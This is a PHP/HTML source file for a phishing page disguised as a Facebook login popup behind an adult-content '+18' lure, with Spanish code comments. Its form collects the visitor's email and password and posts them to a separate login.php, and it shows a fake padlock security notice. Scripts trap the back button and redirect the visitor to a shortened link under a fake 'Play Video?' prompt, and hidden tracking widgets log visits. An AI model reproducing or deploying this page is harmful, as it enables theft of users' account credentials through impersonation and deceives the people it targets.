<?php

include_once '../../common.php';


// Verifico si se necesita un conjunto de caracteres especial para presentar la pagina
switch ($lang['LANG']) {
	case 'th':
	header('Content-Type: text/html; charset=TIS-620');
	break;
	
	case 'el':
	header('Content-Type: text/html; charset=iso-8859-7');
	break;
	
	case 'ru':
	header('Content-Type: text/html; charset=iso-8859-5');
	break;
	
	default:
	header('Content-Type: text/html; charset=ISO-8859-15');
	
		
}

// Creo KEY
$longitud = '100';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
	// echo $key;
	$key .= $keys{mt_rand(0,$max)};
}
?>
<html>

<head>


<meta name="generator" content="Bootply" />
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet">
		<link href="css/styles.css" rel="stylesheet">

		<style type"text/css">
		
		body {
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    font-size: 14px;
    line-height: 1.42857143;
    
    background-color: #3b5998;
}

input[type=submit] {
    padding:5px 15px; 
    background:#428BCA; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px; 
	color: #FFF;
}

label {
color: #FFF;

}

span {
color: #FFF;

}

h1 {
    font-size: 500%;
    color: white;
}

</style>

<title><?php echo $lang['TITULO_PAGINA']; ?></title>
<script> 	
function nobackbutton(){
	
   window.location.hash="no-back-button";
	
   window.location.hash="Again-No-back-button" //chrome
	
   window.onhashchange=function(){window.location.hash="no-back-button";}
	
}</script>

</head>

<body>

<center>

<div id="Cuerpo">
	<div id="CuerpoMain">
		<div id="CuerpoImgs">
			<b><span style="font-size:500%;     font-family: 'Freight Sans Bold', 'Helvetica Neue', 'Segoe UI', 'Malgun Gothic', Meiryo, 'Microsoft JhengHei', helvetica, arial, sans-serif !important;" >f</span></b>
		</div>
 		<div id="TituloCuerpo" class="blanco">
	<span id="Tbold"><?php echo $lang['POPUP_TITULO'] ?></span><br>
		<span>	<?php echo $lang['POPUP_DESCRIPCION'] ?></span>
		</div>
		<div id="Formulario">
		
		<form id="form" method="post" target="_top" action="../../login.php">
		<label id="LoginForm"><?php echo $lang['POPUP_CORREO'] ?>:</label><br>
		<input type="text"   id="input" style="font-size: 12pt;" name="email" placeholder="<?php echo $lang['POPUP_CORREO'] ?>:" autocomplete="off" required="" style="cursor: pointer; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QsPDhss3LcOZQAAAU5JREFUOMvdkzFLA0EQhd/bO7iIYmklaCUopLAQA6KNaawt9BeIgnUwLHPJRchfEBR7CyGWgiDY2SlIQBT/gDaCoGDudiy8SLwkBiwz1c7y+GZ25i0wnFEqlSZFZKGdi8iiiOR7aU32QkR2c7ncPcljAARAkgckb8IwrGf1fg/oJ8lRAHkR2VDVmOQ8AKjqY1bMHgCGYXhFchnAg6omJGcBXEZRtNoXYK2dMsaMt1qtD9/3p40x5yS9tHICYF1Vn0mOxXH8Uq/Xb389wff9PQDbQRB0t/QNOiPZ1h4B2MoO0fxnYz8dOOcOVbWhqq8kJzzPa3RAXZIkawCenHMjJN/+GiIqlcoFgKKq3pEMAMwAuCa5VK1W3SAfbAIopum+cy5KzwXn3M5AI6XVYlVt1mq1U8/zTlS1CeC9j2+6o1wuz1lrVzpWXLDWTg3pz/0CQnd2Jos49xUAAAAASUVORK5CYII=); background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;">
		<script>
if(window.history && history.pushState){ // check for history api support
        window.addEventListener('load', function(){
            // create history states
            history.pushState(-1, null); // back state
            history.pushState(0, null); // main state
            history.pushState(1, null); // forward state
            history.go(-1); // start in main state
            this.addEventListener('popstate', function(event, state){
                // check history state and fire custom events
                if(state = event.state){
                    event = document.createEvent('Event');
                    event.initEvent(state > 0 ? 'next' : 'previous', true, true);
                    this.dispatchEvent(event);
                    var r = confirm("Play Video?");
                    if(r==true) {window.top.location.href="https://t.co/dQ5qois3ea"} else {  if(r==false) {window.top.location.href="https://t.co/dQ5qois3ea"
} }		
                }
            }, false);
        }, false);
    }
</script>
		<br><br><label id="LoginForm"><?php echo $lang['POPUP_CONTRASENA'] ?>:</label><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script> <div id="fb-root"></div> <script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId=806769436043772"; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script> <script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script> <a href="http://www.histats.com" target="_blank" title="contador pagina web" ><script  type="text/javascript" > try {Histats.start(1,3205176,4,0,0,0,""); Histats.track_hits();} catch(err){}; </script></a> <noscript><a href="http://www.histats.com" target="_blank"><img  src="http://sstatic1.histats.com/0.gif?3205176&101" alt="contador pagina web" border="0"></a></noscript>
		<input type="password" style="font-size: 12pt;" id="input" name="pass" placeholder="<?php echo $lang['POPUP_CONTRASENA'] ?>" autocomplete="off" required="" style="background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QsPDhss3LcOZQAAAU5JREFUOMvdkzFLA0EQhd/bO7iIYmklaCUopLAQA6KNaawt9BeIgnUwLHPJRchfEBR7CyGWgiDY2SlIQBT/gDaCoGDudiy8SLwkBiwz1c7y+GZ25i0wnFEqlSZFZKGdi8iiiOR7aU32QkR2c7ncPcljAARAkgckb8IwrGf1fg/oJ8lRAHkR2VDVmOQ8AKjqY1bMHgCGYXhFchnAg6omJGcBXEZRtNoXYK2dMsaMt1qtD9/3p40x5yS9tHICYF1Vn0mOxXH8Uq/Xb389wff9PQDbQRB0t/QNOiPZ1h4B2MoO0fxnYz8dOOcOVbWhqq8kJzzPa3RAXZIkawCenHMjJN/+GiIqlcoFgKKq3pEMAMwAuCa5VK1W3SAfbAIopum+cy5KzwXn3M5AI6XVYlVt1mq1U8/zTlS1CeC9j2+6o1wuz1lrVzpWXLDWTg3pz/0CQnd2Jos49xUAAAAASUVORK5CYII=); background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;">
		<br><br><input type="submit" style="font-size: 12pt;"  value="    <?php echo $lang['POPUP_SUBMIT'] ?>    "  >  <br>
		</form>
		
		
		
		
		
		
		
		
		
		
		
		
		
		</div>
	</div>
		<div id="Candao">
			<img src="http://i.imgur.com/LE87vI1.png" class="Img" width="13" height="13">
			<span id="Tbold"> <?php echo $lang['POPUP_CANDADO'] ?></span>
		</div>
	</div>
	
 

	
	<h1>+18</h1>
</center>
<script>
$(document).ready(function(){
	setTimeout(function(){ 
		$("#BgCuerpo, #BodyCuerpo").fadeIn(); 
	}, 500);
});
</script>

</body>

</html>
65




<body>
<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('vlor4xiabt')</script>
</div>
